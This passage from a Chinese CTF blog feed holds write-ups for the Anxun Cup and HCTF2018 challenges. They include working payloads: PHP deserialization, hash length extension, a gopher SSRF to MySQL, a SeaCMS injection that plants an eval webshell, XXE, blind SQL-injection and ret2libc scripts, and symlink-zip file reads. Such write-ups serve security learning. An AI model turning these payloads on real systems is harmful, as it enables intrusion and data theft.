alt=""></p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入<code>$_SESSION</code>数据的，这里就利用到了反序列化问题<br>考虑序列化</p><pre><code class="php">&lt;?phpclass Anti{    public $info=&#39;print_r(scandir(dirname(__FILE__)));&#39;;}$obj = new Anti();echo serialize($obj);?&gt;</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543217312.4219046.jpg" alt=""></p><pre><code>O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><pre><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}print_r(scandir(dirname(FILE)));</code></pre><p><a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a></p><p>D0g3{Sim_Pl3_S3sSi0n}</p><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><pre><code class="php">&lt;?php@error_reporting(0);$flag = &quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;;$secret_key = &quot;xxxxxxxxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];header(&quot;hash_key:&quot; . $hash_key);if (!empty($_COOKIE[&quot;getflag&quot;])) {    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) {        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) {            echo &quot;Great! You&#39;re in!\n&quot;;            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);        }        else {            die (&quot;Go out! Hacker!&quot;);        }    }    else {        die (&quot;LEAVE! You&#39;re not one of us!&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    echo &quot;&lt;source_code&gt;&quot;;    }}?&gt;</code></pre><p>我们如果需要获得flag，需要满足一下条件：<br>1.Cookie中getflag的值不能为空<br>2.username必须为D0g3和password不能为D0g3<br>3.Cookie中的getmein必须等于<code>md5($secret.urldecode($username.$password))</code></p><pre><code>满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少`setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));`发现下面有行代码是这样写的，将输出的`md5($secret . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;))`作为cookie输出，结合前面的数据包我们可以知道输出的值为`c3ef608fdc59d9143c39664ade7556d5` 可是这串md5是由$secret+‘Doog3Dog3’转md5而得到的，如果我们在password输入D0g3将不满足前面所需的三个条件</code></pre><p>flag为，username为D0g3，password不可为D0g3，添加cookies，变量名为getflag，要求为：</p><p>c3ef608fdc59d9143c39664ade7556d5</p><p>安装hashdump</p><pre><code>git clone https://github.com/bwall/HashPumpyum install openssl-devel yum install gcc-c++cd HashPumpmakemake install</code></pre><p>利用hashpump来构造poc</p><pre><code>hashpumpInput Signature: c3ef608fdc59d9143c39664ade7556d5Input Data: D0g3Input Key Length: 20Input Data to Add: m15e64be7722f2e46d78d483264ebc5c8D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00m</code></pre><p>将\x改为%，将POST的username改为D0g3，password改为D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test，cookie加入getflag: </p><p>15e64be7722f2e46d78d483264ebc5c8<br>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00m</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239040.2746198.jpg" alt=""></p><!-- The flag is D0g3{h4sh_1s_s0_diffic1ut_t0_me}--><h3 id="Diglett-蒙古"><a href="#Diglett-蒙古" class="headerlink" title="Diglett-蒙古"></a>Diglett-蒙古</h3><p><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239059.928092.jpg" alt=""></p><p>得到源码</p><pre><code>&lt;?php    include_once &quot;config.php&quot;;    if (isset($_POST[&#39;url&#39;])&amp;&amp;!empty($_POST[&#39;url&#39;]))    {        $url = $_POST[&#39;url&#39;];        if(preg_match(&#39;/file/&#39;,$url))        {             echo &quot;No hacker!&quot;;             echo &quot;&lt;/br&gt;&quot;;        }        $url2 = preg_replace(&#39;/file/&#39;,&#39;&#39;,$url);        $content_url = getUrlContent($url2);    }    else    {        $content_url = &quot;&quot;;    }    if(isset($_GET[&#39;hu3debug&#39;]))    {        show_source(__FILE__);    }    ?&gt;</code></pre><p>过滤了file尝试双写绕过</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239074.1999197.jpg" alt=""></p><p>读配置文件<br>url=fifilele://localhost/var/www/config.php</p><pre><code>&lt;?php$hosts = &quot;localhost&quot;;$dbusername = &quot;test_user&quot;;$dbpasswd = &quot;&quot;;$dbname = &quot;test&quot;;$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn){    $dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;    if(mysqli_query($conn,$dbinit)) return 1;    else return 0;}function safe($url){    $tmpurl = parse_url($url, PHP_URL_HOST);    if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)    {        var_dump($tmpurl);        die(&quot;&lt;h1&gt;&lt;p id=&#39;test1&#39;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);    }    return $url;}function getUrlContent($url){    $url = safe($url);    $url = escapeshellarg($url);    $pl = &quot;curl &quot;.$url;    echo $pl;    $content = shell_exec($pl);    return $content;}initdb($conn);?&gt;</code></pre><p>知道了mysql的配置内容 gopher一波<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239086.1100788.jpg" alt=""></p><pre><code>gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239095.9827178.jpg" alt=""></p><p>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p><h3 id="BOOM"><a href="#BOOM" class="headerlink" title="BOOM"></a>BOOM</h3><p>御剑扫目录</p><p>robots.txt和/admin/login.html，robots.txt里有/readme_.html，拿到了管理员用户名和错的密码</p><p>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239108.3526225.jpg" alt=""><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239118.7877207.jpg" alt="">登录拿flag</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239138.7812676.jpg" alt=""></p><p>70e052657cb40cf142883abaff266fee</p><h3 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h3><p><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a></p><pre><code>http://138.68.2.14/seacms/search.phppost:searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</code></pre><p>写shell</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php%20@eval($_POST[c])?&gt;&#39;);</code></pre><p>提示.git泄露，用工具读出源码吧</p><p>\data\ common.inc.php有配置信息</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239162.399129.jpg" alt=""></p><p>直接写sql语句读取flag</p><pre><code>http://138.68.2.14/seacms/search.phpsearchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($Misplaced &amp;_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=$con =mysql_connect(&quot;localhost&quot;,&quot;d0g3&quot;,&quot;FlagIsHere&quot;);mysql_select_db(&quot;flag&quot;, $con);$result = mysql_query(&quot;SELECT * from flag&quot;);$row = mysql_fetch_array($result);var_dump($row);</code></pre><h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p><a href="https://mp.weixin.qq.com/s/iLJEdzJSQD5cv66AftbJ3A" target="_blank" rel="external">https://mp.weixin.qq.com/s/iLJEdzJSQD5cv66AftbJ3A</a></p><p>Host: 45.77.200.106</p><p>思路是在忘记密码处，填入管理员账户<code>admin</code>，重置管理员账号密码，然后登录管理员账号。</p><p>但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了</p><p>登录后还有一个输入框，任意提交一个字符串后抓包发现</p><pre><code class="xaml">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</code></pre><p>xxe无误，直接读取文件</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY myentity SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot; &gt;]&gt;&lt;information&gt;&lt;username&gt;&amp;myentity;&lt;/username&gt;&lt;/information&gt;</code></pre><p>拿到flag的base64编码</p><pre><code>PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==</code></pre><h3 id="simple-sqli"><a href="#simple-sqli" class="headerlink" title="simple sqli"></a>simple sqli</h3><p>一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入</p><pre><code>sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell</code></pre><p>当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo</p><p>直接读取flag</p><pre><code>select load_file(&#39;/www/sqli/secret.php&#39;)</code></pre><p>base64解码后就是flag</p><pre><code>D0g3{iaown_oiasnd_asdasda}</code></pre><h3 id="webN中国"><a href="#webN中国" class="headerlink" title="webN中国"></a>webN中国</h3><p><a href="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/" target="_blank" rel="external">https://michaelwayneliu.github.io/2017/12/21/SOME攻击/</a></p><p><strong>webN**</strong>（<strong><strong>400</strong></strong>）**</p><p>题目：<br> 你们点的大餐<br> <a href="http://222.18.158.245:6080/" target="_blank" rel="external">http://222.18.158.245:6080/</a></p><p>tip：Some攻击<br> tip2：为什么不问问富萝莉客服呢？虽然她有点傲娇<br> hint: <a href="https://pan.baidu.com/s/1F93XXi68eqU1uw_Pl7_kfQ" target="_blank" rel="external">https://pan.baidu.com/s/1F93XXi68eqU1uw_Pl7_kfQ</a> 提取码：tv5y</p><p>confirm.php 存在jsonp操作，可控，直接修改网上脚本，父页面执行pay方法<br> <img src="http://phxj316sb.bkt.clouddn.com/674czxvs06mhow3873eahuuq2r.png" alt="img"></p><p>poc:</p><pre><code class="javascript">&lt;iframe src=&quot;http://222.18.158.245:6080/reward.php&quot; name=b&gt;&lt;/iframe&gt;        &lt;iframe name=a&gt;&lt;/iframe&gt;        &lt;script&gt;        window.frames[0].open(&#39;http://222.18.158.245:6080/confirm.php&#39;,&#39;a&#39;);        setTimeout(          function(){            window.frames[1].location.href = &#39;http://222.18.158.245:6080/confirm.php?callback=window.opener.pay&#39;;          }        ,1000);&lt;/script&gt;</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239180.9615023.jpg" alt=""><br> 获取到flag：D0g3{Same_Orig1n_Method_ExCute_1s_eAsy}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="巴西-neko（200）"><a href="#巴西-neko（200）" class="headerlink" title="巴西-neko（200）"></a><strong>巴西-neko（200）</strong></h3><p>第一次两次溢出泄露got任意两个函数的地址去查libc版本，找到/bin/sh的偏移，system函数有就很简单了<br>第二次启shell，栈溢出的题目的一般方法</p><pre><code class="python">#!/usr/bin/pythonfrom pwn import *context(log_level = &quot;debug&quot;, os = &quot;linux&quot;, arch = &quot;i386&quot;)elf = &quot;./neko&quot;#LIBC = &quot;libc64.so&quot;elf = ELF(elf)libc = elf.libctar = remote(&#39;149.248.7.48&#39;,9999)#-----------------------------------------------------------------def dbg(script = &quot;&quot;, elf = elf, arch = &quot;amd64&quot;):    gdb.attach(tar, gdbscript = script)def sh():    tar.interactive()#-----------------------------------------------------------------system = elf.plt[&quot;system&quot;]puts = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]puts_off = 0x05f140binsh_off = 0x15902bvuln = 0x080486E7#-----------------------------------------------------------------tar.sendlineafter(&quot;cats?\n&quot;,&#39;y&#39;)pl = &#39;&#39;pl += &#39;1&#39; * 0xd4pl += p32(puts)pl += p32(vuln)pl += p32(puts_got)tar.sendafter(&quot;anchovies:\n&quot;,pl)tar.recvline()libc_base = u32(tar.recv(4)) - puts_offbinsh = libc_base + binsh_offsuccess(&quot;libc base : &quot;+hex(libc_base))pl = &#39;&#39;pl += &#39;1&#39; * 0xd4pl += p32(system)pl += p32(binsh) * 2tar.sendafter(&quot;anchovies:\n&quot;,pl)sh()</code></pre><h3 id="哈萨克-hiahiahia（200-）"><a href="#哈萨克-hiahiahia（200-）" class="headerlink" title="哈萨克**-hiahiahia（200**）"></a><strong>哈萨克**</strong>-hiahiahia<strong><strong>（</strong></strong>200<strong>**）</strong></h3><p>很简单的一个题目，和oj上的一个类似，溢出覆盖arg[0]利用stack-chk-fail打印flag。。。懒到不想写脚本<br> <img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239197.2212636.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一届安洵杯writeup&quot;&gt;&lt;a href=&quot;#第一届安洵杯writeup&quot; class=&quot;headerlink&quot; title=&quot;第一届安洵杯writeup&quot;&gt;&lt;/a&gt;第一届安洵杯writeup&lt;/h1&gt;&lt;h2 id=&quot;MIsc&quot;&gt;&lt;a href=&quot;#MIsc&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://mang0.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018-web writeup</title>
    <link href="http://mang0.me/archives/4341f801/"/>
    <id>http://mang0.me/archives/4341f801/</id>
    <published>2018-11-13T05:26:20.000Z</published>
    <updated>2018-11-14T05:30:24.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只做出两道惭愧，复现学一下。</p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><img src="/archives/4341f801/1541944707375.png" alt="1541944707375"></p><p><img src="/archives/4341f801/1541944804344.png" alt="1541944804344"></p><p>右键源码提示存在source.php</p><p>点进去查看源码</p><pre><code>&lt;?php    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt;</code></pre><p>hint点进去知道flag在 ffffllllaaaagggg<img src="/archives/4341f801/1541944745955.png" alt="1541944745955"></p><p>出现问题的代码：</p><pre><code class="php">$_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }</code></pre><p>如果让source.php%253f/../../../../../../../ffffllllaaaagggg。其中source.php是whitelist里面的文件 ，<code>253f</code>是?的双重<code>urlencode.php</code>会自动进行一次urldecode，php会将source.php%253f/当成一个目录，所以需要多加一个../来包含我们可控的文件。</p><p><a href="http://warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../../ffffllllaaaagggg" target="_blank" rel="external">http://warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../../ffffllllaaaagggg</a></p><p>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</p><p>参考文章：</p><p><a href="https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#3-phpMyAdmin-4-8-1-getshell-%E5%AE%9E%E6%88%98" target="_blank" rel="external">https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#3-phpMyAdmin-4-8-1-getshell-%E5%AE%9E%E6%88%98</a></p><h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>www.zip泄露</p><p>审计</p><p>在member.php有cookie注入，而且每个页面都包含了member.php</p><pre><code class="php">if (isset($_COOKIE[&quot;islogin&quot;])) {    if ($_COOKIE[&quot;login_data&quot;]) {        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);        $admin_user = $login_data[&#39;admin_user&#39;];        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>直接从<code>$_COOKIE</code>中取的数据，并且直接拼接到了SQL语句中</p><pre><code class="sql">$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>通过json_decode+php弱类型可以绕过登录鉴权admin，然后以这个来做标记来bool注入</p><pre><code class="python">#coding:utf-8import requestsurl = &quot;http://kzone.2018.hctf.io/admin/list.php&quot;cookies = {    &quot;_ga&quot;: &quot;GA1.2.1556483061.1541786955&quot;,    &quot;_gid&quot;: &quot;GA1.2.140952073.1541786955&quot;,    &quot;PHPSESSID&quot;: &quot;72m84deran77afu36is1dbi3k7&quot;,    &quot;islogin&quot;: &quot;1&quot;}#payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))))and'1","admin_pass":65}}&#39;&#39;&#39;#payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;#payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))))and'1","admin_pass":65}}&#39;&#39;&#39;#payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(f1a9)from(F1444g)))))and'1","admin_pass":65}}&#39;&#39;&#39; #字段名是试出来的payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(f1a9)from(F1444g)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;get = &quot;&quot;for i in xrange(50):    for j in xrange(32, 127):        data = payload1.format(get, chr(j))        cookies[&quot;login_data&quot;] = data        r = requests.get(url, cookies = cookies)        if &quot;Fish&quot; in r.content:            data = payload2.format(get, chr(j))            cookies[&quot;login_data&quot;] = data            r = requests.get(url, cookies = cookies)            if &quot;Fish&quot; not in r.content:                get += chr(j)                print get                break</code></pre><p>hctf{4526a8cbd741b3f790f95ad32c2514b9}</p><p><a href="https://www.anquanke.com/post/id/163958#h2-0" target="_blank" rel="external">https://www.anquanke.com/post/id/163958#h2-0</a></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>走了很多弯路 上传js会解析 可以xss 但没有作用</p><p>后来发现文章<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="external">https://xz.aliyun.com/t/2589</a></p><p>用zip 压缩软连接读环境变量</p><p>ln -s /etc/profile  profile<br>zip -y profile.zip profile </p><p><code>/proc/self/environ</code>，能读到uwsgi配置文件</p><pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=7d8beb1a9aa4SHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><p>当前进程的工作目录在<code>/app/hard_t0_guess_n9f5a95b5ku9fg</code><br>UWSGI配置文件在<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code><br>软连接读取配置文件</p><p> ln -s /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini ini<br> zip -y ini.zip ini</p><pre><code>module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</code></pre><p>发现主文件<code>app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code><br>接着软连接读项目源码</p><p> ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py mainpy<br> zip -y mainpy.zip mainpy</p><p><img src="/archives/4341f801/1542008448450.png" alt="1542008448450"></p><p>直接打开没换行。查看源码就可以换行版本 代码如下：</p><pre><code class="python"># -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024ALLOWED_EXTENSIONS = set([&#39;zip&#39;])def allowed_file(filename):    return &#39;.&#39; in filename and \           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def index():    error = request.args.get(&#39;error&#39;, &#39;&#39;)    if(error == &#39;1&#39;):        session.pop(&#39;username&#39;, None)        return render_template(&#39;index.html&#39;, forbidden=1)    if &#39;username&#39; in session:        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)    else:        return render_template(&#39;index.html&#39;)@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])def login():    username=request.form[&#39;username&#39;]    password=request.form[&#39;password&#39;]    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:        if(username == &#39;admin&#39;):            return redirect(url_for(&#39;index&#39;,error=1))        session[&#39;username&#39;] = username    return redirect(url_for(&#39;index&#39;))@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])def logout():    session.pop(&#39;username&#39;, None)    return redirect(url_for(&#39;index&#39;))@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])def upload_file():    if &#39;the_file&#39; not in request.files:        return redirect(url_for(&#39;index&#39;))    file = request.files[&#39;the_file&#39;]    if file.filename == &#39;&#39;:        return redirect(url_for(&#39;index&#39;))    if file and allowed_file(file.filename):        filename = secure_filename(file.filename)        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)        if(os.path.exists(file_save_path)):            return &#39;This file already exists&#39;        file.save(file_save_path)    else:        return &#39;This file is not a zipfile&#39;    try:        extract_path = file_save_path + &#39;_&#39;        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)        file = read_obj.read()        read_obj.close()        os.system(&#39;rm -rf &#39; + extract_path)    except Exception as e:        file = None    os.remove(file_save_path)    if(file != None):        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error=1))    return Response(file)if __name__ == &#39;__main__&#39;:    #app.run(debug=True)    app.run(host=&#39;127.0.0.1&#39;, debug=True, port=10008)</code></pre><p>查看源码发现引用了<code>flag.py</code>，但是不能直接读<code>flag.py</code>，因为里面<code>hctf</code>字样的flag会被如下代码过滤掉</p><pre><code class="python">if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error=1))</code></pre><p>读了templates/index.html，发现用户名为admin的时候才会输出flag</p><pre><code>ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html indexzip -y index.zip index</code></pre><p><img src="/archives/4341f801/1542010367267.png" alt="1542010367267"></p><p>所有 